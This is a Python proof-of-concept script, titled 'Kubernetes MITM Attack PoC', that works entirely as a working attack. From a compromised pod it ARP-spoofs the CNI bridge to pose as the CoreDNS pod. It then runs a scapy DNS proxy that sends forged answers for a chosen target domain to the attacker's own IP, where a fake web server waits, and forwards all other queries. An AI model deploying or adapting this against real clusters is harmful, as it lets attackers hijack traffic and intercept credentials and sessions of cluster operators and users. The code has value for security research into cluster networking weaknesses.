#!/usr/bin/python3
# issues about scapy with Pycharm:
# https://stackoverflow.com/questions/45691654/unresolved-reference-with-scapy

import sys
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
from multiprocessing import Process
from scapy.layers.inet import IP, UDP, Ether, ICMP
from scapy.layers.l2 import ARP
from scapy.sendrecv import srp1, srp, send, sendp, sniff, sr1
from scapy.layers.dns import DNS, DNSQR, DNSRR


class S(BaseHTTPRequestHandler):
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_response()
        self.wfile.write("F4ke Website\n".encode('utf-8'))


class DnsProxy:
    """ Handles DNS request packets, will forward them to real kube-dns, except for targeted domains. """

    def __init__(self, upstream_server, local_server_mac, local_server_ip,
                 self_mac, self_ip, fake_domain, interface):
        self.upstream_server = upstream_server
        self.local_server_mac = local_server_mac
        self.local_server_ip = local_server_ip
        self.mac = self_mac
        self.ip = self_ip
        self.fake_domain = fake_domain
        self.interface = interface

    @staticmethod
    def generate_response(request, ip=None, nx=None):
        return DNS(id=request[DNS].id,
                   aa=1,  # authoritative
                   qr=1,  # a response
                   rd=request[DNS].rd,  # copy recursion
                   qdcount=request[DNS].qdcount,  # copy question count
                   qd=request[DNS].qd,  # copy question itself
                   ancount=1 if not nx else 0,  # we provide a single answer
                   an=DNSRR(
            rrname=request[DNS].qd.qname,
            type='A',
            ttl=1,
            rdata=ip) if not nx else None,
            rcode=0 if not nx else 3
        )

    @staticmethod
    def is_local_domain(domain):
        for tld in (".local.", ".internal."):
            if domain.decode('ascii').endswith(tld):
                return True

    def forward(self, req_pkt, verbose):
        # first contacting local dns server
        req_domain = req_pkt[DNSQR].qname
        def parse_responses(p): return ', '.join(
            [str(p[DNSRR][x].rdata) for x in range(p[DNS].ancount)])

        # if local, get response from kube-dns
        if self.is_local_domain(req_domain):
            answer = sr1(IP(dst=self.local_server_ip) / UDP() / DNS(rd=0,
                                                                    id=req_pkt[DNS].id,
                                                                    qd=DNSQR(qname=req_domain)),
                         verbose=verbose,
                         timeout=1)
            resp_pkt = Ether(
                src=self.local_server_mac) / IP(
                dst=req_pkt[IP].src,
                src=self.local_server_ip) / UDP(
                sport=53,
                dport=req_pkt[UDP].sport) / DNS()
            # if timeout, returning NXDOMAIN
            if answer:
                resp_pkt[DNS] = answer[DNS]
            else:
                resp_pkt[DNS] = self.generate_response(req_pkt, nx=True)
            sendp(resp_pkt, verbose=verbose)
            print("[+] {} <- KUBE-DNS response {} - {}".format(resp_pkt[IP].dst, str(req_domain),
                                                               parse_responses(resp_pkt) if resp_pkt[DNS].rcode == 0
                                                               else resp_pkt[DNS].rcode))
        # else, get with upstream
        else:
            answer = sr1(IP(dst=self.upstream_server) / UDP() /
                         DNS(rd=1, qd=DNSQR(qname=req_domain)), verbose=verbose)
            resp_pkt = Ether(
                src=self.local_server_mac) / IP(
                dst=req_pkt[IP].src,
                src=self.local_server_ip) / UDP(
                sport=53,
                dport=req_pkt[UDP].sport) / DNS()
            resp_pkt[DNS] = answer[DNS]
            resp_pkt[DNS].id = req_pkt[DNS].id
            sendp(resp_pkt, verbose=verbose)
            print("[+] {} <- UPSTREAM response {} - {}".format(resp_pkt[IP].dst, str(req_domain),
                                                               parse_responses(resp_pkt) if resp_pkt[DNS].rcode == 0
                                                               else resp_pkt[DNS].rcode))

    def spoof(self, req_pkt):
        spf_resp = IP(dst=req_pkt[IP].src,
                      src=self.local_server_ip) / UDP(dport=req_pkt[UDP].sport,
                                                      sport=53) / self.generate_response(req_pkt,
                                                                                         ip=self.ip)

        send(spf_resp, verbose=0, iface=self.interface)
        print("[+] Spoofed response to: {} | {} is at {}".format(spf_resp[IP].dst,
                                                                 str(req_pkt["DNS Question Record"].qname), self.ip))

    def handle_queries(self, req_pkt):
        """ decides whether to spoof or forward the packet """
        if req_pkt["DNS Question Record"].qname.startswith(self.fake_domain.encode(
                'utf-8')):
            self.spoof(req_pkt)
        else:
            self.forward(req_pkt, verbose=False)

    def dns_req_filter(self, pkt):
        return (UDP in pkt and
                DNS in pkt and
                pkt[DNS].opcode == 0 and
                pkt[DNS].ancount == 0 and
                pkt[UDP].dport == 53 and
                pkt[Ether].dst == self.mac and
                pkt[IP].dst == self.local_server_ip)

    def start(self):
        # sniffing and filtering dns queries sent to self
        sniff(
            lfilter=self.dns_req_filter,
            prn=self.handle_queries,
            iface=self.interface,
            store=False)


def get_self_mac_ip():
    return Ether().src, ARP().psrc


def get_kube_dns_svc_ip():
    with open('/etc/resolv.conf', 'r') as f:
        return f.readline().strip().split(' ')[1]


def get_coredns_pod_mac_ip(kube_dns_svc_ip, self_ip, verbose):
    mac = srp1(Ether() / IP(dst=kube_dns_svc_ip) /
               UDP(dport=53) / DNS(rd=1, qd=DNSQR()), verbose=verbose).src
    answers, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                     ARP(pdst="{}/24".format(self_ip)), timeout=4, verbose=verbose)
    for answer in answers:
        if answer[1].src == mac:
            return mac, answer[1][ARP].psrc

    return None, None


def get_bridge_mac_ip(verbose):
    res = srp1(Ether() / IP(dst="8.8.8.8", ttl=1) / ICMP(), verbose=verbose)
    return res[Ether].src, res[IP].src


def arp_spoofing(bridge_ip, coredns_pod_ip,
                 bridge_mac, verbose):
    while True:
        send(ARP(op=2,
                 pdst=bridge_ip,
                 psrc=coredns_pod_ip,
                 hwdst=bridge_mac),
             verbose=verbose)


def fake_http_server():
    server_address = ('', 80)
    server = HTTPServer(server_address, S)
    server.serve_forever()


def main(verbose):
    print("Kubernetes MITM Attack PoC")

    print("[*] Starting HTTP Server at 80...")
    p1 = Process(target=fake_http_server)
    p1.start()

    self_mac, self_ip = get_self_mac_ip()
    print("[+] Current pod IP: %s, MAC: %s" % (self_ip, self_mac))
    kube_dns_svc_ip = get_kube_dns_svc_ip()
    print("[+] Kubernetes DNS service IP: %s" % kube_dns_svc_ip)
    coredns_pod_mac, coredns_pod_ip = get_coredns_pod_mac_ip(
        kube_dns_svc_ip, self_ip, verbose=verbose)
    print("[+] CoreDNS pod IP: %s, MAC: %s" %
          (coredns_pod_ip, coredns_pod_mac))
    bridge_mac, bridge_ip = get_bridge_mac_ip(verbose=verbose)
    print("[+] CNI bridge IP: %s, MAC: %s" % (bridge_ip, bridge_mac))

    print("[*] Starting ARP spoofing...")
    p2 = Process(
        target=arp_spoofing,
        args=(
            bridge_ip,
            coredns_pod_ip,
            bridge_mac,
            verbose))
    p2.start()

    print("[*] Starting DNS proxy...")
    # proxy dns query and response
    dns_proxy = DnsProxy(
        upstream_server="8.8.8.8",
        local_server_mac=coredns_pod_mac,
        local_server_ip=coredns_pod_ip,
        self_mac=self_mac,
        self_ip=self_ip,
        fake_domain=sys.argv[1],
        interface='eth0')
    p3 = Process(target=dns_proxy.start)
    p3.start()

    while True:
        time.sleep(1)


def usage():
    print(
        "Usage:\n\tpython3 {} target_domain".format(
            sys.argv[0]))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        usage()
    else:
        main(verbose=False)
